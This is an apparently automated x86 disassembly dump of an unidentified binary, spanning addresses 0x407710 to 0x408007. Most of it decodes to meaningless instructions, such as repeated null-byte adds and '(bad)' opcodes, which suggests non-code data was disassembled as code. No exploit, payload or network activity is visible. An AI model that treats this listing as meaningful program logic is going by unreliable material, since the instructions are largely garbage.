  407710:	cld    
  407711:	add    BYTE PTR [eax],al
  407713:	add    BYTE PTR [eax],al
  407715:	pop    es
  407716:	add    BYTE PTR [eax],al
  407718:	cld    
  407719:	add    BYTE PTR [eax],al
  40771b:	add    BYTE PTR [eax],al
  40771d:	pop    es
  40771e:	add    BYTE PTR [eax],al
  407720:	cld    
  407721:	add    BYTE PTR [eax],al
  407723:	add    BYTE PTR [eax],al
  407725:	add    eax,DWORD PTR [eax]
  407727:	add    ah,bh
  407729:	add    BYTE PTR [eax],al
  40772b:	add    BYTE PTR [eax],al
  40772d:	add    eax,DWORD PTR [eax]
  40772f:	add    ah,bh
  407731:	add    BYTE PTR [eax],al
  407733:	add    BYTE PTR [eax],al
  407735:	add    eax,DWORD PTR [eax]
  407737:	add    ah,bh
  407739:	add    BYTE PTR [eax],al
  40773b:	add    BYTE PTR [eax],al
  40773d:	pop    es
  40773e:	add    BYTE PTR [eax],al
  407740:	cld    
  407741:	add    BYTE PTR [eax],al
  407743:	pop    ds
  407744:	(bad)  
  407745:	inc    DWORD PTR [eax]
  407747:	add    ah,bh
  407749:	add    BYTE PTR [eax],al
  40774b:	pop    ds
  40774c:	(bad)  
  40774d:	inc    DWORD PTR [eax]
  40774f:	add    ah,bh
  407751:	add    BYTE PTR [eax],al
  407753:	pop    ds
  407754:	(bad)  
  407755:	inc    DWORD PTR [eax]
  407757:	add    ah,bh
  407759:	add    BYTE PTR [eax],al
  40775b:	pop    ds
  40775c:	(bad)  
  40775d:	inc    DWORD PTR [eax]
  40775f:	add    ah,bh
  407761:	add    BYTE PTR [eax],al
  407763:	pop    ds
  407764:	(bad)  
  407765:	inc    DWORD PTR [eax]
  407767:	add    ah,bh
  407769:	add    BYTE PTR [eax],al
  40776b:	pop    ds
  40776c:	(bad)  
  40776d:	inc    DWORD PTR [eax]
  40776f:	add    ah,bh
  407771:	add    BYTE PTR [eax],al
  407773:	pop    ds
  407774:	(bad)  
  407775:	inc    DWORD PTR [eax]
  407777:	add    ah,bh
  407779:	add    BYTE PTR [eax],al
  40777b:	pop    ds
  40777c:	(bad)  
  40777d:	inc    DWORD PTR [eax]
  40777f:	add    ah,bh
  407781:	add    BYTE PTR [eax],al
  407783:	pop    ds
  407784:	(bad)  
  407785:	inc    DWORD PTR [eax]
  407787:	add    ah,bh
  407789:	add    BYTE PTR [eax],al
  40778b:	pop    ds
  40778c:	(bad)  
  40778d:	inc    DWORD PTR [eax]
  40778f:	add    ah,bh
  407791:	add    BYTE PTR [eax],al
  407793:	pop    ds
  407794:	(bad)  
  407795:	inc    DWORD PTR [eax]
  407797:	add    ah,bh
  407799:	add    BYTE PTR [eax],al
  40779b:	pop    ds
  40779c:	(bad)  
  40779d:	inc    DWORD PTR [eax]
  40779f:	add    ah,bh
  4077a1:	add    BYTE PTR [eax],al
  4077a3:	pop    ds
  4077a4:	(bad)  
  4077a5:	inc    DWORD PTR [eax]
  4077a7:	add    ah,bh
  4077a9:	add    BYTE PTR [eax],al
  4077ab:	pop    ds
  4077ac:	(bad)  
  4077ad:	inc    DWORD PTR [eax]
  4077af:	add    ah,bh
  4077b1:	add    BYTE PTR [eax],al
  4077b3:	pop    ds
  4077b4:	(bad)  
  4077b5:	inc    DWORD PTR [eax]
  4077b7:	add    dh,bh
  4077b9:	add    BYTE PTR [eax],al
  4077bb:	aas    
  4077bc:	(bad)  
  4077bd:	inc    DWORD PTR [eax]
  4077bf:	add    bh,bh
  4077c1:	rol    BYTE PTR [ecx],0xff
  4077c4:	(bad)  
  4077c5:	inc    DWORD PTR [eax]
  4077c7:	add    bh,bh
  4077c9:	(bad)  
  4077ca:	(bad)  
  4077cb:	(bad)  
  4077cc:	(bad)  
  4077cd:	inc    DWORD PTR [eax]
  4077cf:	add    bh,bh
  4077d1:	(bad)  
  4077d2:	(bad)  
  4077d3:	(bad)  
  4077d4:	(bad)  
  4077d5:	inc    DWORD PTR [eax]
  4077d7:	add    bh,bh
  4077d9:	(bad)  
  4077da:	(bad)  
  4077db:	(bad)  
  4077dc:	(bad)  
  4077dd:	inc    DWORD PTR [eax]
  4077df:	add    BYTE PTR [eax],ch
  4077e1:	add    BYTE PTR [eax],al
  4077e3:	add    BYTE PTR [eax],ah
  4077e5:	add    BYTE PTR [eax],al
  4077e7:	add    BYTE PTR [eax+0x0],al
  4077ea:	add    BYTE PTR [eax],al
  4077ec:	add    DWORD PTR [eax],eax
  4077ee:	or     BYTE PTR [eax],al
  4077f0:	add    BYTE PTR [eax],al
  4077f2:	add    BYTE PTR [eax],al
  4077f4:	add    BYTE PTR [eax+eax*1],al
	...
  4077ff:	add    BYTE PTR [eax],al
  407801:	add    DWORD PTR [eax],eax
  407803:	add    BYTE PTR [eax],al
  407805:	add    DWORD PTR [eax],eax
  407807:	add    BYTE PTR [eax],al
  407809:	add    BYTE PTR [eax],al
  40780b:	add    BYTE PTR [ecx+0x78],dh
  40780e:	ins    BYTE PTR es:[edi],dx
  40780f:	add    BYTE PTR [edx-0x54ffda85],ch
  407815:	jl     0x40783e
  407817:	add    BYTE PTR [edx-0x59ffd789],ah
  40781d:	ja     0x40784a
  40781f:	add    BYTE PTR [edx-0x52ffd586],ch
  407825:	js     0x407850
  407827:	add    BYTE PTR [edx-0x59ffd483],bh
  40782d:	jg     0x407868
  40782f:	add    bh,al
  407831:	jns    0x40785a
  407833:	add    al,cl
  407835:	js     0x40785b
  407837:	add    cl,al
  407839:	jo     0x407868
  40783b:	add    ah,al
  40783d:	jb     0x40786b
  40783f:	add    dh,al
  407841:	js     0x40786c
  407843:	add    ah,al
  407845:	jbe    0x40787d
  407847:	add    ah,al
  407849:	jns    0x40787b
  40784b:	add    BYTE PTR [edx+eax*4+0x6d],ah
  40784f:	add    BYTE PTR [esp+eax*4+0x6d],ah
  407853:	add    BYTE PTR [edi-0x77],ch
  407856:	imul   eax,DWORD PTR [eax],0xffffffaf
  407859:	sub    BYTE PTR [edi],0x0
  40785c:	mov    ecx,0xb1002a88
  407861:	test   BYTE PTR [ebx],dh
  407863:	add    BYTE PTR [ecx-0x40ffc97b],dh
  407869:	(bad)  
  40786a:	xor    al,0x0
  40786c:	mov    ah,0x8a
  40786e:	cmp    eax,0x3b96be00
  407873:	add    ah,cl
  407875:	and    BYTE PTR [eax+eax*1],0xcc
  407879:	sub    DWORD PTR [esi],0x0
  40787c:	ret    0x288e
  40787f:	add    dh,cl
  407881:	mov    ch,BYTE PTR ds:0x3383c100
  407887:	add    ch,al
  407889:	xor    DWORD PTR ds:0x3797c600,0x0
  407890:	int    0x99
  407892:	xor    al,0x0
  407894:	into   
  407895:	pushf  
  407896:	xor    al,0x0
  407898:	enter  0x3a9e,0x0
  40789c:	aad    0x94
  40789e:	xor    eax,DWORD PTR [eax]
  4078a0:	rcl    BYTE PTR [ebp+esi*1+0x3598d600],cl
  4078a7:	add    bl,dl
  4078a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078aa:	cmp    al,BYTE PTR [eax]
  4078ac:	(bad)  [ebx-0x7d73ffc2]
  4078b2:	dec    ecx
  4078b3:	add    BYTE PTR [eax+edx*4-0x6d46ffb9],dh
  4078ba:	inc    ebp
  4078bb:	add    BYTE PTR [ecx-0x45ffbb6b],bh
  4078c1:	xchg   ebx,eax
  4078c2:	dec    esi
  4078c3:	add    BYTE PTR [esi-0x43ffb26a],bh
  4078c9:	xchg   esi,eax
  4078ca:	push   ebx
  4078cb:	add    BYTE PTR [ecx+ebx*4-0x6541ffae],bh
  4078d2:	pop    edx
  4078d3:	add    BYTE PTR [edi-0x39ff905f],bh
  4078d9:	add    DWORD PTR [esi+0x0],0x479cc5
  4078e0:	int3   
  4078e1:	sahf   
  4078e2:	dec    edi
  4078e3:	add    bl,cl
  4078e5:	mov    dl,BYTE PTR [edx+0x0]
  4078e8:	ret    
  4078e9:	fwait
  4078ea:	push   edi
  4078eb:	add    cl,al
  4078ed:	sahf   
  4078ee:	pop    eax
  4078ef:	add    al,al
  4078f1:	popf   
  4078f2:	pop    esi
  4078f3:	add    ch,dl
  4078f5:	sahf   
  4078f6:	pop    edx
  4078f7:	add    ch,cl
  4078f9:	mov    ds:0xa5d8004c,eax
  4078fe:	inc    ebp
  4078ff:	add    al,cl
  407901:	mov    ds:0xabd40052,eax
  407906:	push   edx
  407907:	add    bh,dl
  407909:	lods   eax,DWORD PTR ds:[esi]
  40790a:	push   edi
  40790b:	add    dh,bl
  40790d:	scas   eax,DWORD PTR es:[edi]
  40790e:	pop    edi
  40790f:	add    ch,bl
  407911:	mov    al,0x5d
  407913:	add    cl,ah
  407915:	mov    bl,0x5f
  407917:	add    al,ah
  407919:	mov    esp,0x9ad3005a
  40791e:	arpl   WORD PTR [eax],ax
  407920:	rcr    BYTE PTR [ecx-0x5431ff9b],cl
  407926:	pusha  
  407927:	add    bh,al
  407929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792a:	imul   eax,DWORD PTR [eax],0xffffffc2
  40792d:	mov    ds:0xa4c9006f,eax
  407932:	outs   dx,DWORD PTR ds:[esi]
  407933:	add    ah,cl
  407935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407936:	outs   dx,DWORD PTR ds:[esi]
  407937:	add    dl,cl
  407939:	stos   BYTE PTR es:[edi],al
  40793a:	imul   eax,DWORD PTR [eax],0xffffffca
  40793d:	lods   al,BYTE PTR ds:[esi]
  40793e:	imul   eax,DWORD PTR [eax],0xffffffcd
  407941:	test   al,0x6e
  407943:	add    ah,dl
  407945:	mov    ds:0xa4d1006f,eax
  40794a:	outs   dx,DWORD PTR ds:[esi]
  40794b:	add    ch,dl
  40794d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794e:	outs   dx,DWORD PTR ds:[esi]
  40794f:	add    dh,dl
  407951:	mov    dl,0x65
  407953:	add    ch,bl
  407955:	mov    eax,0xa3c40062
  40795a:	jo     0x40795c
  40795c:	ret    
  40795d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795e:	jo     0x407960
  407960:	int    0xad
  407962:	jno    0x407964
  407964:	shl    DWORD PTR [edi-0x563dff87],0x7a
  40796b:	add    ch,dl
  40796d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796e:	jne    0x407970
  407970:	shr    BYTE PTR [eax-0x4323ff8e],cl
  407976:	jae    0x407978
  407978:	shl    BYTE PTR [ebx-0x4b2fff87],1
  40797e:	jp     0x407980
  407980:	fidivr DWORD PTR [ebp-0x4022ff83]
  407986:	jle    0x407988
  407988:	loope  0x407941
  40798a:	bound  eax,QWORD PTR [eax]
  40798c:	loope  0x40794d
  40798e:	ins    DWORD PTR es:[edi],dx
  40798f:	add    ch,ah
  407991:	mov    esi,0xb6e10073
  407996:	jns    0x407998
  407998:	in     eax,0xc1
  40799a:	imul   eax,DWORD PTR [eax],0xffffffe5
  40799d:	shl    DWORD PTR [ebx+0x0],0xe5
  4079a1:	ret    0x75
  4079a4:	cmp    al,0x68
  4079a6:	mov    DWORD PTR [eax],eax
  4079a8:	inc    ecx
  4079a9:	ins    DWORD PTR es:[edi],dx
  4079aa:	lea    eax,[eax]
  4079ac:	inc    ecx
  4079ad:	js     0x407949
  4079af:	add    BYTE PTR [ecx+0x79],al
  4079b2:	popf   
  4079b3:	add    BYTE PTR [ecx+0x7c],al
  4079b6:	lahf   
  4079b7:	add    BYTE PTR [eax+0x78],dl
  4079ba:	xchg   esi,eax
  4079bb:	add    BYTE PTR [eax+0x7e],dl
  4079be:	popf   
  4079bf:	add    BYTE PTR [edx+0x7d],al
  4079c2:	mov    al,ds:0xa07e4d00
  4079c7:	add    BYTE PTR [edi],bl
  4079c9:	mov    ?,WORD PTR [esi-0x567cc600]
  4079cf:	add    BYTE PTR ds:0x3e00af97,dh
  4079d5:	xchg   edx,eax
  4079d6:	mov    edx,0x8c8f5400
  4079db:	add    BYTE PTR [edi-0x7f],cl
  4079de:	mov    eax,ds:0xa1815100
  4079e3:	add    BYTE PTR [edx-0x7b],dl
  4079e6:	mov    ds:0xa2865500,al
  4079eb:	add    BYTE PTR [ebp-0x7a],dl
  4079ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079ef:	add    BYTE PTR [esi-0x76],dl
  4079f2:	test   eax,0xad8e5a00
  4079f7:	add    BYTE PTR [edi-0x70],dl
  4079fa:	stos   BYTE PTR es:[edi],al
  4079fb:	add    BYTE PTR [ecx+edx*4-0x53],bl
  4079ff:	add    BYTE PTR [esi-0x6e],al
  407a02:	mov    ch,0x0
  407a04:	inc    edi
  407a05:	sahf   
  407a06:	mov    bh,0x0
  407a08:	mov    ah,BYTE PTR [si+0x6700]
  407a0d:	cwde   
  407a0e:	mov    bl,0x0
  407a10:	imul   ebx,DWORD PTR [ecx-0x5982ff4c],0xa97b00be
  407a1a:	mov    esp,0xcf9d1a00
  407a1f:	add    BYTE PTR [eax],al
  407a21:	mov    edx,ebx
  407a23:	add    BYTE PTR [eax],al
  407a25:	mov    dl,bh
  407a27:	add    BYTE PTR [eax],al
  407a29:	mov    ebx,eax
  407a2b:	add    BYTE PTR [ecx],al
  407a2d:	xchg   edx,eax
  407a2e:	aad    0x0
  407a30:	adc    DWORD PTR [esi-0x76dbff26],ebx
  407a36:	rol    BYTE PTR [eax],0x37
  407a39:	call   0xc2:0x983f00c7
  407a40:	sub    eax,0x2d00dead
  407a45:	lods   eax,DWORD PTR ds:[esi]
  407a46:	loopne 0x407a48
  407a48:	sub    esi,DWORD PTR [edx-0x46cdff1b]
  407a4e:	jmp    0x4000:0xf2bf2c00
  407a55:	call   0xc5:0x9d4200c3
  407a5c:	inc    esp
  407a5d:	lahf   
  407a5e:	enter  0x4600,0xa1
  407a62:	leave  
  407a63:	add    BYTE PTR [esp+ebp*4-0x3c],ah
  407a67:	add    BYTE PTR [esi-0x4d],ah
  407a6a:	int    0x0
  407a6c:	jae    0x407a1f
  407a6e:	leave  
  407a6f:	add    BYTE PTR [eax-0x4b],ch
  407a72:	rol    DWORD PTR [eax],cl
  407a74:	outs   dx,DWORD PTR ds:[esi]
  407a75:	mov    ebp,0xb84600d7
  407a7a:	loopne 0x407a7c
  407a7c:	inc    ebp
  407a7d:	mov    edx,0xc02d00e4
  407a82:	repz add BYTE PTR [edi-0x3f],dh
  407a86:	rol    BYTE PTR [eax],cl
  407a88:	jnp    0x407a56
  407a8a:	fild   WORD PTR [eax]
  407a8c:	pop    esp
  407a8d:	(bad)  
  407a8e:	jmp    0x5500:0xe8c95f00
  407a95:	into   
  407a96:	repnz add BYTE PTR [eax-0x36],ah
  407a9a:	jmp    0x7800:0xe6cf7300
  407aa1:	fsubr  st,st(7)
  407aa3:	add    BYTE PTR [ebp-0x29],ch
  407aa6:	stc    
  407aa7:	add    BYTE PTR [ecx-0x28],bh
  407aaa:	lock add BYTE PTR [ecx-0x2fff475d],cl
  407ab1:	mov    dh,0x86
  407ab3:	add    cl,dl
  407ab5:	mov    bh,0x89
  407ab7:	add    bh,dl
  407ab9:	mov    ebp,0xbfdb008e
  407abe:	lea    eax,[eax]
  407ac0:	sar    BYTE PTR [esi+edx*4-0x6e442500],1
  407ac7:	add    dh,bl
  407ac9:	ret    
  407aca:	add    DWORD PTR [eax],0x82c0e6
  407ad0:	out    0xc7,eax
  407ad2:	add    BYTE PTR [eax],0xe9
  407ad5:	mov    DWORD PTR [ebp-0x78361900],0x84c9e800
  407adf:	add    ah,ah
  407ae1:	leave  
  407ae2:	mov    es,WORD PTR [eax]
  407ae4:	jmp    0xe94106b3
  407ae9:	into   
  407aea:	xchg   ecx,eax
  407aeb:	add    dl,ah
  407aed:	retf   
  407aee:	cwde   
  407aef:	add    cl,ah
  407af1:	shl    BYTE PTR [edi-0x5a2f1900],1
  407af7:	add    al,ch
  407af9:	aad    0xa3
  407afb:	add    ch,ch
  407afd:	shr    BYTE PTR [esi-0x55221000],cl
  407b03:	add    al,ch
  407b05:	aam    0xb1
  407b07:	add    bl,ch
  407b09:	fnstenv [eax-0x4e251200]
  407b0f:	add    ch,ch
  407b11:	fdiv   QWORD PTR [eax-0x4b251300]
  407b17:	add    dh,ch
  407b19:	xlat   BYTE PTR ds:[ebx]
  407b1a:	mov    eax,0xbadcee00
  407b1f:	add    bh,ch
  407b21:	loopne 0x407adc
  407b23:	add    dl,dh
  407b25:	jecxz  0x407ae4
  407b27:	add    BYTE PTR [ebx-0x66ff3f56],al
  407b2d:	mov    ecx,0xbc9e00cc
  407b32:	into   
  407b33:	add    BYTE PTR [eax-0x75ff2f43],bl
  407b39:	(bad)
  407b3c:	nop
  407b3d:	ret    0xd4
  407b40:	or     esi,0xffffffe2
  407b43:	add    BYTE PTR [eax-0x58ff0e26],al
  407b49:	(bad)  
  407b4b:	add    BYTE PTR [edi-0x7eff1521],ch
  407b51:	loope  0x407b47
  407b53:	add    BYTE PTR [eax-0x6aff0d1f],cl
  407b59:	call   0xe4d47c53
  407b5e:	stc    
  407b5f:	add    BYTE PTR [ecx-0x42ff131e],ah
  407b65:	jmp    0x407b55
  407b67:	add    BYTE PTR [edx+ebp*8-0x135dff0c],ah
  407b6e:	clc    
  407b6f:	add    BYTE PTR [ecx-0x46ff0b10],bh
  407b75:	repz cld 
  407b77:	add    BYTE PTR [ecx-0x4fff0309],bh
  407b7d:	clc    
  407b7e:	inc    DWORD PTR [eax]
  407b80:	out    dx,al
  407b81:	faddp  st(0),st
  407b83:	add    dl,dh
  407b85:	loop   0x407b50
  407b87:	add    ch,dh
  407b89:	jmp    0xeb357c57
  407b8e:	into   
  407b8f:	add    cl,dh
  407b91:	call   0xf0387c66
  407b96:	fld    DWORD PTR [eax]
  407b98:	stc    
  407b99:	icebp  
  407b9a:	fild   WORD PTR [eax]
  407b9c:	(bad)  
  407b9d:	repnz cmc 
  407b9f:	add    ch,al
  407ba1:	std    
  407ba2:	inc    DWORD PTR [eax]
  407ba4:	iret   
  407ba5:	clc    
  407ba6:	sti    
  407ba7:	add    dl,cl
  407ba9:	cli    
  407baa:	std    
  407bab:	add    cl,cl
  407bad:	(bad)  
  407bae:	inc    DWORD PTR [eax]
  407bb0:	into   
  407bb1:	std    
  407bb2:	inc    DWORD PTR [eax]
  407bb4:	sar    esi,1
  407bb6:	inc    DWORD PTR [eax]
  407bb8:	aad    0xff
  407bba:	inc    DWORD PTR [eax]
  407bbc:	(bad)  
  407bbe:	inc    DWORD PTR [eax]
  407bc0:	fdivp  st(7),st
  407bc2:	inc    DWORD PTR [eax]
  407bc4:	cli    
  407bc5:	hlt    
  407bc6:	in     eax,0x0
  407bc8:	sti    
  407bc9:	cmc    
  407bca:	call   0xf33a77cf
  407bcf:	add    dh,bh
  407bd1:	std    
  407bd2:	cli    
  407bd3:	add    bh,bh
  407bd5:	(bad)  
  407bd6:	inc    BYTE PTR [eax]
	...
  407c04:	(bad)  
  407c05:	(bad)  
  407c06:	inc    DWORD PTR [eax]
	...
  407c98:	xor    BYTE PTR [edx],al
  407c9a:	add    al,BYTE PTR [edx]
  407c9c:	add    al,BYTE PTR [edx]
  407c9e:	add    al,BYTE PTR [edx]
  407ca0:	add    al,BYTE PTR [edx]
  407ca2:	add    dh,BYTE PTR [eax]
	...
  407cb4:	add    BYTE PTR [eax],al
  407cb6:	add    BYTE PTR [eax],dh
  407cb8:	scas   al,BYTE PTR es:[edi]
  407cb9:	pop    eax
  407cba:	xor    ecx,DWORD PTR [ecx+0x54]
  407cbd:	dec    edx
  407cbe:	dec    edx
  407cbf:	push   eax
  407cc0:	push   eax
  407cc1:	push   eax
  407cc2:	pop    ecx
  407cc3:	scas   eax,DWORD PTR es:[edi]
  407cc4:	add    al,BYTE PTR [eax]
	...
  407cd6:	add    BYTE PTR [edx],bh
  407cd8:	push   edi
  407cd9:	or     DWORD PTR [esp+eax*1],eax
  407cdc:	push   es
  407cdd:	push   es
  407cde:	or     BYTE PTR [edi],bl
  407ce0:	pop    ds
  407ce1:	adc    BYTE PTR [esi+eax*2],cl
  407ce4:	sbb    DWORD PTR [eax],eax
	...
  407cf6:	add    BYTE PTR [edx-0x45d2d4ac],ch
  407cfc:	sbb    BYTE PTR ds:[esi],dh
  407cff:	(bad)  
  407d01:	(bad)  
  407d02:	les    esi,FWORD PTR [edi]
  407d04:	cmp    BYTE PTR [eax],al
	...
  407d0e:	add    BYTE PTR [eax],al
  407d10:	add    BYTE PTR [ecx+0x67686c80],ch
  407d16:	push   0x1a313201
  407d1b:	loop   0x407d0e
  407d1d:	mov    al,0x40
  407d1f:	rol    ecx,0xbd
  407d22:	mov    ebp,0xab4e34
  407d27:	add    BYTE PTR [eax],al
  407d29:	add    BYTE PTR [eax],al
  407d2b:	add    BYTE PTR [eax],al
  407d2d:	add    BYTE PTR [ebx+0x71],bh
  407d30:	jle    0x407cc9
  407d32:	lahf   
  407d33:	mov    al,ds:0x7f9ca2a5
  407d38:	sbb    DWORD PTR [edx],edi
  407d3a:	adc    eax,0xc2f2bc24
  407d3f:	cmp    eax,0xf0e1c26
  407d44:	pop    edx
  407d45:	cmp    al,BYTE PTR [eax]
  407d47:	add    BYTE PTR [eax],al
  407d49:	add    BYTE PTR [eax],al
  407d4b:	add    BYTE PTR [eax],al
  407d4d:	ins    DWORD PTR es:[edi],dx
  407d4e:	jae    0x407ce1
  407d50:	mov    ds:0xa6d3d4d2,eax
  407d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d56:	pushf  
  407d57:	pop    DWORD PTR [edx]
  407d59:	dec    esi
  407d5a:	adc    eax,0xef61231d
  407d5f:	in     al,0x42
  407d61:	push   ds
  407d62:	or     ecx,DWORD PTR [eax+edx*2]
  407d65:	pop    ss
  407d66:	add    BYTE PTR [eax],al
  407d68:	add    BYTE PTR [eax],al
  407d6a:	add    BYTE PTR [eax],al
  407d6c:	add    BYTE PTR [edi-0x73],ch
  407d6f:	sahf   
  407d70:	mov    ds:0xa6d3d4d2,eax
  407d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d76:	pushf  
  407d77:	(bad)
  407d7b:	and    DWORD PTR [ebx],esp
  407d7d:	sub    BYTE PTR [eax+esi*8-0xf],al
  407d81:	daa    
  407d82:	sbb    ecx,DWORD PTR [ebx]
  407d84:	inc    esi
  407d85:	pop    ss
  407d86:	add    BYTE PTR [eax],al
  407d88:	add    BYTE PTR [eax],al
  407d8a:	add    BYTE PTR [eax],al
  407d8c:	add    BYTE PTR [ebp-0x6d],dh
  407d8f:	sahf   
  407d90:	mov    ds:0xa6d3d4d2,eax
  407d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d96:	pushf  
  407d97:	(bad)  
  407d98:	adc    ebx,DWORD PTR [edi+eax*2+0x3c]
  407d9c:	aas    
  407d9d:	push   ebx
  407d9e:	(bad)  
  407d9f:	repnz mov esi,0x3b1e2629
  407da5:	das    
  407da6:	add    BYTE PTR [eax],al
  407da8:	add    BYTE PTR [eax],al
  407daa:	add    BYTE PTR [eax],al
  407dac:	add    BYTE PTR [esi-0x6d],dh
  407daf:	sahf   
  407db0:	mov    ds:0xa8d3d4d2,eax
  407db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db6:	popf   
  407db7:	(bad)  
  407db8:	je     0x407e08
  407dba:	pop    esi
  407dbb:	push   edx
  407dbc:	pop    ebx
  407dbd:	(bad)  
  407dbe:	repnz loope 0x407e25
  407dc1:	pusha  
  407dc2:	pusha  
  407dc3:	inc    ecx
  407dc4:	arpl   WORD PTR [esi+0x0],dx
  407dc7:	add    BYTE PTR [eax],al
  407dc9:	add    BYTE PTR [eax],al
  407dcb:	add    BYTE PTR [eax],al
  407dcd:	jbe    0x407d62
  407dcf:	sahf   
  407dd0:	mov    ds:0xa6d3d4d2,eax
  407dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd6:	popf   
  407dd7:	(bad)  
  407dd8:	jb     0x407e09
  407dda:	mov    ecx,0xe4f2c25e
  407ddf:	mov    dl,0x66
  407de1:	bound  sp,DWORD PTR [edx-0x4f]
  407de5:	lods   eax,DWORD PTR ds:[esi]
  407de6:	dec    edx
  407de7:	add    BYTE PTR [eax],al
  407de9:	add    BYTE PTR [eax],al
  407deb:	add    BYTE PTR [eax],al
  407ded:	js     0x407d84
  407def:	xchg   edx,eax
  407df0:	mov    ds:0xa6d3d4d2,eax
  407df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407df6:	pushf  
  407df7:	nop
  407df8:	test   DWORD PTR [edx+eax*8],edx
  407dfb:	mov    dh,0xc2
  407dfd:	loop   0x407db7
  407dff:	mov    ah,0xb4
  407e01:	mov    ah,0xb3
  407e03:	mov    ah,0xb7
  407e05:	mov    esp,0x2d
  407e0a:	add    BYTE PTR [eax],al
  407e0c:	add    BYTE PTR [esi-0x6b],dh
  407e0f:	xchg   edx,eax
  407e10:	mov    ds:0xa6d3d4d2,eax
  407e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e16:	popf   
  407e17:	(bad)
  407e1b:	vcmpss xmm0,xmm7,xmm2,0xc1
  407e20:	rol    ecx,0xc1
  407e23:	rol    ecx,0xbd
  407e26:	xor    BYTE PTR [eax],al
  407e28:	add    BYTE PTR [eax],al
  407e2a:	add    BYTE PTR [eax],al
  407e2c:	add    BYTE PTR [eax-0x6d],bh
  407e2f:	sahf   
  407e30:	mov    ds:0xa6d3d4d2,eax
  407e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e36:	pushf  
  407e37:	lwpins ecx,DWORD PTR [edx],0x2060206
  407e40:	add    al,BYTE PTR [edx]
  407e42:	add    al,BYTE PTR [edx]
  407e44:	add    ch,BYTE PTR [esi]
  407e46:	add    BYTE PTR [eax],al
  407e48:	add    BYTE PTR [eax],al
  407e4a:	add    BYTE PTR [eax],al
  407e4c:	add    BYTE PTR [eax-0x6d],bh
  407e4f:	sahf   
  407e50:	mov    ds:0xa6d3d4d2,eax
  407e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e56:	popf   
  407e57:	(bad)
  407e5b:	mov    BYTE PTR [ebx+0x69],cl
	...
  407e6d:	js     0x407e04
  407e6f:	xchg   edx,eax
  407e70:	mov    ds:0xa6d3d4d2,eax
  407e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e76:	popf   
  407e77:	nop
  407e78:	mov    cl,BYTE PTR [ecx+0x698b8886]
	...
  407e8a:	add    BYTE PTR [eax],al
  407e8c:	add    BYTE PTR [esi-0x6b],dh
  407e8f:	xchg   edx,eax
  407e90:	mov    ds:0xa6d3d4d2,eax
  407e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e96:	pushf  
  407e97:	(bad)
  407e9b:	mov    BYTE PTR [ebx+0x69],cl
	...
  407ead:	js     0x407e42
  407eaf:	sahf   
  407eb0:	mov    ds:0xa6d3d4d2,eax
  407eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb6:	popf   
  407eb7:	(bad)
  407ebb:	mov    BYTE PTR [ebx+0x69],cl
	...
  407ecd:	js     0x407e62
  407ecf:	sahf   
  407ed0:	mov    ds:0xa6d3d4d2,eax
  407ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed6:	pushf  
  407ed7:	(bad)
  407edb:	mov    BYTE PTR [ebx+0x69],cl
	...
  407eed:	js     0x407e84
  407eef:	xchg   edx,eax
  407ef0:	mov    ds:0xa6d3d4d2,eax
  407ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ef6:	popf   
  407ef7:	(bad)
  407efb:	mov    BYTE PTR [ebx+0x69],cl
	...
  407f0d:	jbe    0x407ea5
  407f0f:	xchg   edx,eax
  407f10:	mov    ds:0xa6d3d4d2,eax
  407f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f16:	pushf  
  407f17:	nop
  407f18:	mov    cl,BYTE PTR [ecx+0x698b8886]
	...
  407f2a:	add    BYTE PTR [eax],al
  407f2c:	add    BYTE PTR [edx-0x6a],bh
  407f2f:	xchg   edx,eax
  407f30:	mov    ds:0xa6d3d4d2,eax
  407f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f36:	pushf  
  407f37:	(bad)
  407f3b:	xchg   BYTE PTR [ebx+0x6e],cl
	...
  407f4d:	jp     0x407ee5
  407f4f:	xchg   edx,eax
  407f50:	mov    ds:0xa8d3d4d2,eax
  407f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f56:	pushf  
  407f57:	(bad)
  407f5b:	mov    BYTE PTR [ebx+0x6e],cl
	...
  407f6d:	jp     0x407f09
  407f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f70:	aad    0xdb
  407f72:	call   0xe72c685f
  407f77:	fcmovnu st,st(1)
  407f79:	iret   
  407f7a:	mov    eax,ds:0x6e8c90
	...
  407f8b:	add    BYTE PTR [eax],al
  407f8d:	test   cl,dl
  407f8f:	call   0xec2e6d81
  407f94:	in     eax,dx
  407f95:	jmp    0x407f82
  407f97:	call   0xde276884
  407f9c:	fdivr  DWORD PTR [eax+eax*1+0x0]
	...
  407fac:	add    BYTE PTR [eax],al
  407fae:	retf   
  407faf:	cdq    
  407fb0:	int3   
  407fb1:	rcl    bh,1
  407fb3:	in     eax,0xeb
  407fb5:	jmp    0x407f9f
  407fb7:	fcmovbe st,st(6)
  407fb9:	into   
  407fba:	fwait
  407fbb:	cwde   
  407fbc:	int    0x0
	...
  407fd2:	retf   0x81c8
  407fd5:	jl     0x407f59
  407fd7:	test   dl,cl
	...
  408005:	add    BYTE PTR [eax],al
  408007:	add    bh,bh
